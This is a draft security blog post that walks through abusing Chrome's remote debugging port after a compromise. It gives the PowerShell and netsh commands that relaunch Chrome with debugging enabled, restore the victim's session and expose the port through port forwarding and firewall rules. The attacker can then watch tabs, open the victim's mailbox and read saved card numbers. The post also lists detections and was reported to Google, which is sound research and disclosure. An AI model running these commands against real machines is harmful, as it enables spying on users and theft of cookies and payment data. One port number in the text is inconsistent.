---
title: "Post-Exploitation: Abusing Chrome's debugging feature to observe and control browsing sessions remotely"
date: 2020-04-28T18:00:00-07:00
draft: true
tags: [
        "red","blue", "cookies","book","ttp","post-exploitation"
    ]
---

Chrome's remote debugging feature enables malware post-exploitation to gain access to cookies. Root privileges are not required. This is a pretty well-known and commonly used adversarial technique - at least since 2018 when **Cookie Crimes** was released. 

However, remote debugging also **allows observing user activities and sensitive personal information (aka spying on users) and controlling the browser from a remote computer**. 

![Hacker](/blog/images/2020/hacker.png)


Below screenshot shows a simulated attacker controlling the victim's browser and navigating to *chrome://settings* to inspect information:

[![Chrome Remote Debug](/blog/images/2020/chromeremotedebugcc.PNG)](/blog/images/2020/chromeremotedebugcc.PNG)

This is what we will discuss and explore more in this post, and it is a summary of one of the techniques described in the book ["Cybersecurity Attacks - Red Team Strategies"](https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&tag=wunderwuzzi-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=1838828869&linkId=07bfd6b729fbc2b2904160e0e16c337f).  

At a high level, remote debugging is a development/test feature which, for some reason, made it into the ordinary retail version of Chrome. 

#### **Since its a "feature" and requires an adversary/malware to be present on the machine (post-exploitation) Chromium likely won't be changing anything. Hence this post will highlight important detections that Anti-Virus products and Blue Teams should put in place to have telemetry for catching potential misuse or attacks and protecting users.**

*Hopefully this post can help raise additional awareness to improve detections and countermeasures.*

**But, first things first....**

## Entering Cookie Crimes

A very powerful cookie stealing technique was described by *mangopdf* in 2018 with **"[Cookie Crimes](https://github.com/defaultnamehere/cookie_crimes)"**. Chrome offers a remote debugging feature that can be abused by adversaries and malware post-exploitation to steal cookies (doesn't need root permissions). Cookie Crimes is now also part of Metasploit - cool stuff!

When I first saw this it was super useful right away during post-exploitation phase of red teaming ops on macOS to [Pass the Cookie](https://attack.mitre.org/techniques/T1506/). At that time I also started experimenting more with the **remote debugging features** of Chrome, with some rather scary outcomes - and there is probably a lot more to figure out.

## Automating and remote controlling Chrome 

Besides stealing cookies, the feature allows to **remotely control the browser, observe browsing sessions, and gain access to sensitive user settings (like saved credit card numbers in the browser, etc)**. This is what we are going to discuss now a bit more.

## Disclaimer
This information is for research and educational purposes in order to learn about attacks, help build detection and countermeasures. Security and penetration testing requires authorization from proper stakeholders.

### Headless mode

Chrome supports running headless in the background without the user noticing that it is running. Examples here are given for PowerShell, but feel free to adjust to whatever shell/OS you are using:

* To run Chrome headless without a visible UI, specify the **–headless** option, as follows:

    ```Start-Process "Chrome" "https://www.google.com" --headless``` 
    
    This starts Chrome without the UI. To ensure a smooth start, specify **--no-first-run**. 
    
* By running `Get-Process`, you can observe the newly created process as well. 

* To terminate all Chrome instances, simply run:

    `Get-Process chrome | Stop-Process`

    This can be useful when learning more about this API and experimenting with it. 

## Basics of the Chrome remote debugging feature

To start Chrome with remote debugging enabled run:

`Start-Process "Chrome" "https://www.google.com --headless --remote-debugging-port=9222" `

*If you do not specify --headless and there is already an instance of Chrome running, then Chrome will open the new window in the existing browser and not enable the debugging port. So, either terminate all Chrome instances (using the preceding statement) or launch Chrome headless. We will discuss differences in more detail later.*

Now you can already navigate to `localhost:9222` and see the debugging UI and play around with it:

[![Chrome Remote Debug](/blog/images/2020/chrome-remote-debug.PNG)](/blog/images/2020/chrome-remote-debug.PNG)
At this point an adversary can perform the **"Cookie Crimes attack"** and steal all cookies using the *Network.getAllCookies()* API -  but let's experiment more with the UI.

### Tunneling the UI to the attacker

The debugging port is only available locally now, but malware might make that remotely accessible. In order to do that, the adversary can perform a port forward. This will expose the port remotely over the network.

In Windows, this can be done by an Administrator using the `netsh interface portproxy` command. The following command shows how this is performed:

`netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=48333 connectaddress=127.0.0.1 connectport=9222` 

Remote connections to this port will not be allowed because the firewall blocks them (we forwarded to port 48333). We have to add a new firewall rule to allow port 48333. So, let's allow that port through the firewall. 

There are multiple ways to do this on Windows (we focus on Windows now, but should also work on macOS and Linux):

1. Use netsh to add a new firewall rule:

    `netsh advfirewall firewall add rule name="Open Port 48333" dir=in action=allow protocol=TCP localport=48333`
2. On modern Windows machines, this can also be done via PowerShell commands:

    ` New-NetFirewallRule -Name ChromeRemote -DisplayName "Open Port 48333" -Direction Inbound -Protocol tcp -LocalPort 48333 -Action Allow -Enabled True`

## Automating and remote controlling browsers as adversarial technique 

Now, Mallory (our attacker) can connect from her attack machine to Alice's workstation on port 43888 and start remote controlling Chrome. The following screenshot shows what the initial connection might look like: 

[![Chrome Remote Debug](/blog/images/2020/chromeremotedebug2.PNG)](/blog/images/2020/chromeremotedebug2.PNG)

The  screenshot shows the currently available sessions. These are basically the tabs the victim has opened at this point (for example, after restoring the sessions, or just the home page). 

If you are trying this out yourself, you probably only see the Google home page listed (this is because for now we started a totally new browsing instance). Clicking the link will navigate you to the session/tab of the browser. 

## Spying on Chrome

When creating a headless session we typically don't inherit the user's settings and so forth (you can look at the *--user-data-dir* option to learn more about this). 

Although, there is also the **--restore-last-session** command-line option, which is something the Cookie Crimes author pointed out as well.

The basic idea is to terminate all Chrome instances and then relaunch them with remote debugging enabled. This technique is a bit intrusive, but it is quite effective to restart Chrome with the debug port exposed and at the same time inheriting the users's settings. To test this yourself, follow these steps: 

1. First, terminate all Chrome processes (e.g. using PowerShell, assuming you are in the user's security context)
2. Afterward, launch Chrome in non-headless mode and restore the last session using the following command:

    ```Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"```
3. Then, connect to the remote control UI to observe the victim's browsing sessions/tabs

    [![Chrome Remote Debug](/blog/images/2020/chromeremotedebug2.PNG)](/blog/images/2020/chromeremotedebug2.PNG)

    As can be seen in the screenshot, there are multiple sessions being opened by Alice (the victim): a Google tab, an Outlook.com tab, and a few others.
4. By clicking any of the sessions, the attacker takes control of Alice's browser UI and can observe (as well as interfere with) what the user is doing.

Even multiple attackers can connect to the port and observe the browsing session. 

As an example, in this demo we simulate the victim having a valid cookie for their email account, and if you enter https://outlook.com in the URL of the debugging session (this is the textbox written underneath the browser URL bar), the attacker will get access to the inbox:

[![Mailbox](/blog/images/2020/chromeremotedebug1.PNG)](/blog/images/2020/chromeremotedebug1.PNG)

As you can see, the remote session can be used pretty much like a local one. We can enter text, click buttons, and fully interact with websites. 

## Peeking at settings (credit card numbers. yikes!)

There is one last thing. Navigate to **chrome://settings** with the remote control. 

This includes access to settings, passwords (those will pop up a credential prompt for the victim), payment information, including card number (no popup), addresses, and many other settings. 

The following screenshot shows *chrome://settings* URL of the victim, include observing sensitive information:

[![Chrome Remote Debug](/blog/images/2020/chromeremotedebug3.PNG)](/blog/images/2020/chromeremotedebug3.PNG)

**Important:** During operations consider performing a SSH port forward, so that information goes over an encrypted channel. The examples here are for research and education.

And here is a brief animation - if you are not interested in trying to play around with this yourself:

[![Chrome Remote Hijack](/blog/images/2020/chromehijack.gif)](/blog/images/2020/chromehijack.gif)

## Cleaning up and reverting changes 

Keep in mind that port forwarding was set up earlier to enable the remote exposure of the Chrome debugging API on port 48333. In order to remove port forwarding and revert to the defaults, we can run  the following command: 

`netsh interface portproxy reset`

Alternatively, there is a delete argument. 

The same applies for opening port 48333. The firewall rule can be removed again using the following command:

` netsh advfirewall firewall del rule name="Open Port 48333" `

or if you used the PowerShell example:

` Remove-NetFirewallRule -Name ChromeRemote `

Finally, close all Chrome sessions by running the following command (to get your host back into a clean state):

` Get-Process chrome | Stop-Process `

That's it – the machine should be back in a non-exposed state.

### Port forwarding not really needed

The port forward is not really needed, but I thought its cool to show how this can be done on Windows. Since for some reason those "networky" things seem to be less known on Windows.

Chrome also has the `--remote-debugging-address` feature, that an adversary can set to `0.0.0.0` to listen on all interfaces. Although, that only works in headless mode and needs usage of the custom `--user-data-dir`.

## Detections and Mitigations

* **Blue teams should look for** processes launched with the **--remote-debugging-port** argument, and related features (**--user-data-dir**,...) to identify potential misuse or malware
* **This is a post-exploitation scenario**, so not having malware, adversaries, or multiple admins on your machine is good advise
* **Practicing an Assume Breach mindset** and entertaining the idea that malware is already present on machines (at least on some machines in corporate environments) is always mature and solid advise (because it usually is)
* Chrome should **not allow remote debugging of things like chrome://settings**
* Or maybe at least require the user's password when navigating to **chrome://settings** before showing sensitive information
* Majority of users (probably 99.999%+) do not need remote debugging - maybe there could be a different solution for developers compared to regular users. 
* **I reported this to Google and it was marked as "intended behavior"**

## Red Team Strategies
If you liked this post and found it informative or inspirational, you might be interested in the book ["Cybersecurity Attacks - Red Team Strategies"](https://www.amazon.com/gp/product/1838828869/ref=as_li_tl?ie=UTF8&tag=wunderwuzzi-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=1838828869&linkId=07bfd6b729fbc2b2904160e0e16c337f). The book is filled with further ideas, research and fundamental techniques, as well as red teaming program and people mangement aspects.

Also, feel free to follow or DM me on Twitter: [@wunderwuzzi23](https://twitter.com/wunderwuzzi23)

### Hiccups and changes
Chrome changes quite frequently, so some things need updates and then a few months later they original attacks work again. When I did this the very first time, like over a year ago, there were some URL hiccups that I had to resolve, and described a bit more in the book - but its pretty straight forward to figure out.

The URL that Chrome shows, pointing to something like:
`https://chrome-devtools-frontend.appspot.com/serve_file/@e7fbb071abe9328cdce4feedac9122435fbd1111/inspector.html?ws=[more stuff here]`

That needs to be updated to something like this:
`http://**localhost:9222/devtools**/inspector.html?ws=**localhost:9222**/devtools/page/D9CF6B093CB84FD0378C735AD056FCB7&remoteFrontend=true`

When I did this last time this wasn't necessary. Chrome's behavior changes frequently, so some of this might be different again - most recently it seems that this is at times not necessary anymore (especially if you leverage --restore-last-session)


## References
* [Chromium Blog - Remote Debugging with Chrome Developer](https://blog.chromium.org/2011/05/remote-debugging-with-chrome-developer.html)
* [Cookie Crimes](https://github.com/defaultnamehere/cookie_crimes)
* [MITRE ATT&CK Technique T1539: Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)
* [MITRE ATT&CK Technique T1506: Web Session Cookie](https://attack.mitre.org/techniques/T1506/)
